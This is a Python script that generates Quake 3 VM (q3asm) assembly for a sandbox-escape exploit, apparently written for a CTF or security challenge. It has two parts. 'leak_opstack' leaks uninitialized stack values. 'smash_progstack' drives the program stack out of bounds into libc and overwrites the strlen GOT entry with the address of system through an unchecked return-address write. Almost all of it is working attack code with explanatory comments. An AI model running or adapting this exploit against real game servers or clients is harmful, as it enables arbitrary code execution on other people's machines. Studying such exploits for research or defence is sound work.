# >>>>>>>>>>>>>>>>>>>> leak_opstack <<<<<<<<<<<<<<<<<<<<

# TL;DR: offsets the progstack to pop uninitialized values which are written to memory

# This is accomplished by using the ARG opcode to marshal values directly onto
# the progstack, since this way we avoid having to clobber the progstack with
# pointers we need to write to

# We then give the caller a pointer to our locals / argument marshalling section
# of the progstack (which resides in regular memory), which it can use to
# inspect the leak

# Note that this means that the leak may be overwritten by future calls (whose
# stack frames may inhabit the same memory we use for the leak), but this turns
# out to be fine in practice since our exploit doesn't call anything :)

LEAK_OFFSET_COUNT = 0
LEAK_COUNT = 60 # the ARG opcode only takes a single byte offset, which limits our maximum number of leaked values to ~64

print("""
export leak_opstack
proc leak_opstack 2048 1
""")

# Store the address of the local space at the target of the pointer given as the first argument
print("""
    ADDRFP4 0
    INDIRP4
    ADDRLP4 0
    ASGNP4
""")

# Offset the opstack
print("push\n" * (LEAK_OFFSET_COUNT + LEAK_COUNT))

# Pop a the number of values we want to leak
print("ARGU4\n" * LEAK_COUNT)

# Realign the opstack so we don't crash / encounter weird behavior
print("pop\n" * LEAK_OFFSET_COUNT)

# Call a nop function to reset q3asm's internal argument marshalling state
print("""
    ADDRGP4 nop
    CALLV
    pop
endproc

proc nop 0 0
endproc
""")

# >>>>>>>>>>>>>>>>>>>> smash_progstack <<<<<<<<<<<<<<<<<<<<

# TL;DR: offsets the progstack way out of bounds to land within the bounds of
# libc, then uses the syscall calling convention to overwrite the GOT entry for
# strlen

# The progstack pointer (vm->programStack) is pretty much entirely within our
# controls using the ENTER / LEAVE opcodes, which we can use to offset it
# out-of-bounds into libc's memory.

# There are two ways values are written to the progstack: either through
# argument marshalling using the ARG opcode, or when pushing the return address
# when using the CALL opcode - while the ARG opcode correctly does bounds
# checking on the progstack pointer by masking excess address bits, the return
# address push does not.

# This gives us an OOB write into libc memory, and while we can't easily control
# our return address, when invoking a system call (called address < 0), the
# system call number is also written to the progstack, and an invalid system
# call does not terminate the program. We use this to overwrite the bottom 32
# bits of the strlen GOT entry with a value of our choosing (= the address of
# system) :)

SMASH_OFF = -0x2020ec # overwrites the bottom 32 bits of libc strlen@.got.plt
# (this offset was determined using trial and error with GDB .-.)

print(f"""
export smash_progstack
LABELV smash_progstack
    ENTER {SMASH_OFF}

    LOCAL {SMASH_OFF + 8}
    INDIRP4
    CALLV

    LEAVE {SMASH_OFF}
""")